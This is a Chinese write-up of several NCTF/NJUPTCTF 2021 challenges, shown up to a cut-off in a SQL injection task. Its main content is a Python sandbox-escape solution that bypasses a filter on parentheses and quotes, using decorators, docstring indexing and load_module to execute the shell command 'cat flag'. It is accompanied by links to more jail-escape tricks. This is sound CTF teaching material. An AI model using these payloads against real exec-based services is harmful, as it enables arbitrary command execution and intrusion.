# NCTF/NJUPTCTF 2021 部分 WriteUp
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 引言
> 参赛对象 ：分为校内队伍和校外队伍，其中校内队伍指由南京邮电大学在读学生所组成的队伍。
>
> 参赛要求 ：本次比赛以队伍形式报名参赛，每队至多四人。
>
> 报名开始日期 ：11月22日
>
> 报名截止日期 ：11月26日
>
> 比赛时间 ：11月27日9：00——11月28日21：00
>
> 举行方式 ：线上比赛
>
> 
一年一度的 NCTF 又来了。是南邮的校赛啦。
> 可以回顾一下去年的 Writeup：
>
> [CTF | 2020 NCTF/NJUPTCTF
> 部分WriteUp](https://miaotony.xyz/2020/11/23/CTF_2020NJUPTCTF/)
看到校外队伍今年前六有钱（京东卡）拿，前十就有礼品了，想起来去年还水了个第六，应该还是挺有希望的。
于是就拉上几个小伙伴，组了个 **猫鼠大战** 战队，报名来玩了。
说实话也就是随意看看题，喵喵主要看的 Misc 和 Web 题目，Pwn 和 Reverse 是队友做的。
题目好难，嘤嘤嘤。
## Misc
###  签到
复制粘贴
`NCTF{Welcome_to_NCTF_2021!}`
###  Hex酱的秘密花园
> 题目描述:
>  
>  
>     我们可爱的Hex酱又有了一个强大的功能，可以去执行多行语句惹~
>     但是为了防止有些居心叵测的人，我们专门把括号，单双引号，都过滤掉，噢对不准色色，所以也不准出现h哟~
>
>     Ubuntu Python3.6.9
>
>     快去找Hex酱(QQ:2821876761)私聊吧
>  
>
> 附件：
>  
>  
>     https://nctf.slight-wind.com/misc/hex/runner.py
>     https://attachment.h4ck.fun:9000/misc/hex/runner.py
>  
`runner.py`
    import sys
    from base64 import b64decode
    code = sys.argv[1]
    try:
        data = b64decode(code.encode()).decode()
    except:
        exit(0)
    for c in 'h"\'(':
        if c in data: exit(0)
    exec(data)
u1s1，过滤了其他的都好说，多多少少在 Flask SSTI 或者其他用到 python 命令执行绕过的场合都见的很多了。然而把小括号 `(`
过滤了，那就真没见过了。
比赛的时候网上找了一堆，都说过滤了小括号就执行不了函数了，所以基本无解。
于是想了一天都没想到要怎么绕过这个，唉，还是太菜了……（或者说需要对 python 了解比较多，且要有点脑洞才行了
难道真的没法绕过嘛？不是的。
这里要用到的是 python 里的函数装饰器，也就是 `@` 用法，`@` 符号就是装饰器的语法糖。
[廖雪峰的 python
教程——装饰器](https://www.liaoxuefeng.com/wiki/1016959663602400/1017451662295584)
    def log(func):
        print("%s is running" % func.__name__)
        func()
    @log
    def foo():
        print("i am foo")
执行 `foo` 就相当于执行下面这个之后的 `foo` 函数了。
    foo = log(foo)
而且装饰器是可以嵌套的。
由于没有 ban `os` 这些关键字，可以直接 import 进来拿来用。
而字符的话，由于不能用引号，所以可以用 `__doc__` 从一些对象的 docstrings 文档里通过下标来取。这个要注意相应的 python
版本，这题环境是 Ubuntu Python3.6.9。
（这里推荐用 [pyenv](https://github.com/pyenv/pyenv) 来玩
另外，可以执行多行命令。由于不能用 `(`，不能构造函数了，但还可以构造对象。
其实这里只需要执行系统命令就行，也就是 `system(xxx)`.
一步步来，先用文档构造字符串
    n = {}.__doc__
    s = 'ls'
    s = 'cat flag'
    for i in s:
        try:
            idx = n.index(i)
        except:
            idx = 'error'
        print(i, '===>', idx)
    # l ===> 69
    # s ===> 97
    # 
    # c ===> 2
    # a ===> 27
    # t ===> 3
    #   ===> 6
    # f ===> 75
    # l ===> 69
    # a ===> 27
    # g ===> 42
试了试发现 class 里其实啥都行，比如 `object`, `list`, `int` 都行， ~~反正也就是应付个匿名函数的变量罢了~~ （？）。甚至
`pass` 也行，这么说其实也就是为了满足 class 创建的语法要求吧。
于是喵喵构造的 payload 就是
    from os import system
    n = {}.__doc__
    l = lambda _: n[69]+n[97]  # ls
    f = lambda _: n[2]+n[80]+n[55]+n[6]+n[75]+n[69]+n[80]+n[88]  # cat flag
    @system
    @f
    class x:pass
实际上执行的就是
    system((lambda _:'cat flag')(x))
成功啦！
再看官方 wp，这个就更一般化了。
    b=[].__class__.__base__.__class__.__subclasses__
    d=[].__doc__
    n={}.__doc__
    _=lambda _:[].__class__.__base__
    @b
    @_
    class s:_
    l=s[69]
    q=lambda _:d[66]+d[2]
    p=lambda _:n[2]+n[80]+n[55]+n[6]+n[75]+d[0]+n[80]+n[88]
    @l.load_module
    @q
    class o:_
    @o.system
    @p
    class w:_
详见喵喵的注释。
    b=[].__class__.__base__.__class__.__subclasses__  #  也就是 type.__subclasses__
    d=[].__doc__  # "list() -> new empty list\nlist(iterable) -> new list initialized from iterable's items"
    n={}.__doc__  # "dict() -> new empty dictionary\ndict(mapping) -> new dictionary initialized from a mapping object's\n    (key, value) pairs\ndict(iterable) -> new dictionary initialized as if via:\n    d = {}\n    for k, v in iterable:\n        d[k] = v\ndict(**kwargs) -> new dictionary initialized with the name=value pairs\n    in the keyword argument list.  For example:  dict(one=1, two=2)"
    _=lambda _:[].__class__.__base__  # 
    @b
    @_
    class s:_  # s => type.__subclasses__(object) 是个包含各种class的list
    l=s[69]  # 
    q=lambda _:d[66]+d[2]  # os
    p=lambda _:n[2]+n[80]+n[55]+n[6]+n[75]+d[0]+n[80]+n[88]  # cat flag
    @l.load_module
    @q
    class o:_  # o => 
    @o.system
    @p
    class w:_
一步步加载模块 load_module `os`，最后利用其中的 `system` 执行 `cat flag`。
另外找资料的时候还有一些神奇的发现，列在下面了。
> **Extensive Readings:**
>
>   * [Python模板注入(SSTI)深入学习](https://xz.aliyun.com/t/6885)
>   * [总结 – CTF中的SSTI0x01](https://morblog.cc/posts/21233/) 里面总结了好多种过滤字符的绕过方法
>   * [浅析SSTI(python沙盒绕过)](http://flag0.com/2018/11/11/%E6%B5%85%E6%9E%90SSTI-> python%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87/)
>   * 郁离歌丶的 [python安全之学习笔记（一）](http://yulige.top/?p=502)
> python沙盒逃逸，任意命令执行的一些函数和模块，balabala
>   * [[译]PlaidCTF中一道PyJail逃逸题目分析 ](https://www.gem-love.com/ctf/2345.html)
> python2 中 `x` 和 `repr(x)` 完全等价，这题仅仅通过 `set([':', '%', "'", '', '(', ',',
> ')', '}', '{', '[', '.', ']', ' 来创造数字，再通过切片得到字符。感觉有点类似与 Brainfuck 了。
>   * [一道有趣的pyjail题目分析](https://xz.aliyun.com/t/9271) 用 Unicode 绕过，在 python3
> 中支持 Non-ASCII Identifies 并且所有都会被转换成 unicode 的NFKC
> 也就是标准模式。[unicode字符大全](http://www.52unicode.com/mathematical-alphanumeric-> symbols-zifu)
>   *
> [Python黑魔法-[]绕过空格实现变量覆盖](https://aluvion.github.io/2019/05/02/Python%E9%BB%91%E9%AD%94%E6%B3%95-%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E5%AE%9E%E7%8E%B0%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/)
> 过滤等号时用 for 循环覆盖变量，过滤空格时用 list 生成器和中括号。可以先把过滤的变量给覆盖掉，再 RCE 或者读文件什么的。
>  
>     >     >>> a = 0
>     >>> for a in [1]:
>     ...     pass
>     ...
>     >>> a
>     1
>     >>> a = 0
>     >>> [[str][0]for[a]in[[1]]]
>     []
>     >>> a
>     1
>  
>
>
###  Hello File Format
> 题目描述:
>  
>  
>     aiQG_ is learning to develop programs for macOS GPU.
>     He got a file from the GPU, but he couldn't read it.
>     Can you translate this file for him?
>  
>
> 附件链接:
>  
>  
>     链接：https://pan.baidu.com/s/1swBiyWrAx33M8DDJh7LtNQ
>     提取码：uo1v
>     https://wwn.lanzoui.com/ix6wXwyi0ih
>  
>
> hint:
>  
>  
>     aiQG_ wanted to render one frame of 1920*1080
>  
一个 bin 文件，里面巨多的 0xff
总长度 0x5EEC00，提示说他在渲染一张 1920*1080 的图，除一下发现正好是3倍长度，很明显是 RGB 了。
Exp:
    # >>> 1920*1080
    # 2073600
    # >>> hex(1920*1080)
    # '0x1fa400'
    # >>> 0x5EEC00/0x1fa400
    # 3.0
    from PIL import Image
    with open('GPU data.bin', 'rb') as f:
        s = f.read()
    l = [(s[i], s[i+1], s[i+2]) for i in range(0, len(s), 3)]
    img = Image.new('RGB', (1920, 1080))
    img.putdata(l)
    # img.show()
    img.save('GPU data.png')
    # NCTF{TGA_NOT_GTA}
看了官方 wp 说这个是 [tga 格式](https://en.wikipedia.org/wiki/Truevision_TGA)
> TGA files commonly have the extension “.tga” on PC DOS/Windows systems and
> macOS (older Macintosh systems use the “TPIC” type code). The format can
> store image data with 8, 15, 16, 24, or 32 bits of precision per pixel[3] –
> the maximum 24 bits of RGB and an extra 8-bit alpha channel. Color data can
> be color-mapped, or in direct color or truecolor format. Image data may be
> stored raw, or optionally, a lossless RLE compression similar to PackBits
> can be employed. This type of compression performs poorly for typical
> photographic images, but works acceptably well for simpler images, such as
> icons, cartoons and line drawings.
###  做题做累了来玩玩游戏吧
> 题目描述：
>  
>  
>     做了一天的题目，都累了吧，快来玩玩我新写的飞机大战吧，只要通关就能获得flag哟～
>     对了，如果你真的想玩游戏，也许你需要一个mac，Intel和Apple silicon芯片都支持
>  
>
> 附件链接：
>  
>  
>     https://attachment.h4ck.fun:9000/misc/PlaneFire.app.tar.gz
>     https://upyun.clq0.top/PlaneFire.app.tar.gz
>     https://nctf.slight-wind.com/misc/PlaneFire.app.tar.gz
>  
好像是个 unity 的游戏，题目说要用 mac，Intel 和 Apple silicon 芯片都支持才能玩游戏，可恶啊！
不如直接去资源文件里翻垃圾
很好。
## Web
###  ezsql
> 题目描述: 这还能注入吗 
>
> 附件链接： 
`login.php`
    //...
    num_rows > 0){
            die('NCTF{ez');
        }
        else{
            die('Wrong name or password.');
        }
    }
    //...
`DB.php`
    <?php